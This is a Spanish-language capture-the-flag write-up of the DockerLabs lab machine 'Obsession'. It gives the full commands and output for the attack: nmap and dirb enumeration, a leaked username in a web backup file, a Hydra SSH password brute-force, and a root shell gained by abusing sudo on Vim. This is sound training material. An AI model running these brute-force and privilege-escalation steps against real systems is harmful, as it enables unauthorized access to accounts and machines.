---
title: Obsession
platform: DockerLabs
os: Linux
difficulty: Muy fácil
ip: 172.17.0.2
services: 21/tcp (FTP), 22/tcp (SSH), 80/tcp (HTTP)
hops: 2
tags: [FTP, Dirb, Fuga de credenciales, Hydra, sudo Vim, GTFOBins]
description: Directorio /backup expuesto con un usuario, fuerza bruta SSH con Hydra y escalada a root abusando de un sudo sobre Vim.
---

## Fase 1: Despliegue
obsession.tar · auto_deploy.sh

Se descomprime el archivo, se despliega la máquina y se comprueba la conectividad con la IP asignada.

```terminal [despliegue]
$ unzip obsession.zip
  inflating: obsession.tar
  inflating: auto_deploy.sh
$ bash auto_deploy.sh obsession.tar
==Máquina desplegada, su dirección IP es --> 172.17.0.2==
$ ping -c 4 172.17.0.2
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.045 ms
```

## Fase 2: Reconocimiento
nmap · escaneo de servicios

```terminal [nmap]
$ nmap -sCV -sS -n -Pn -p- 172.17.0.2
PORT   STATE SERVICE VERSION
==21/tcp open  ftp     vsftpd 3.0.5==   <- login anónimo habilitado
22/tcp open  ssh     OpenSSH 9.6p1
80/tcp open  http    Apache httpd 2.4.58
```

Tres servicios: **FTP** (con acceso anónimo), **SSH** y una **web** de coaching en el 80.

## Fase 3: Enumeración web
dirb · directorio /backup

El código fuente de la web tiene un comentario sospechoso. Ampliamos la búsqueda de recursos ocultos con **Dirb**.

```terminal [dirb]
$ dirb http://172.17.0.2
==> DIRECTORY: ==http://172.17.0.2/backup/==
+ http://172.17.0.2/backup/backup.txt (CODE:200)
```

Dentro de `/backup/` hay un `backup.txt` con información sensible:

```terminal [backup.txt]
$ curl http://172.17.0.2/backup/backup.txt
==Usuario para todos mis servicios: russoski (cambiar pronto!)==
```

Tenemos un usuario válido: **russoski**.

## Fase 4: Explotación · fuerza bruta
hydra sobre SSH

```terminal [hydra]
$ hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 50 -I
[22][ssh] host: 172.17.0.2   login: russoski   password: ==iloveme==
```

Con **`russoski` : `iloveme`** entramos por SSH:

```terminal [acceso como russoski]
$ ssh russoski@172.17.0.2
==russoski@a1919dfe5717:~$==
```

## Fase 5 · Final: Escalada de privilegios · sudo Vim {root}
russoski → root

Revisamos los permisos de `sudo`:

```terminal [sudo -l]
russoski@a1919dfe5717:~$ sudo -l
User russoski may run the following commands on a1919dfe5717:
    (root) NOPASSWD: ==/usr/bin/vim==
```

> [!NOTE] GTFOBins · Vim
> Vim ejecutable como `root` permite lanzar un shell desde su modo comando (`:!`). Es un abuso clásico recogido en GTFOBins.

```terminal [escalada a root]
russoski@a1919dfe5717:~$ sudo /usr/bin/vim -c ':!/bin/bash'
# whoami
==root==
```

:::flag
¡Máquina completada! Acceso conseguido como root.
uid=0(root)
:::
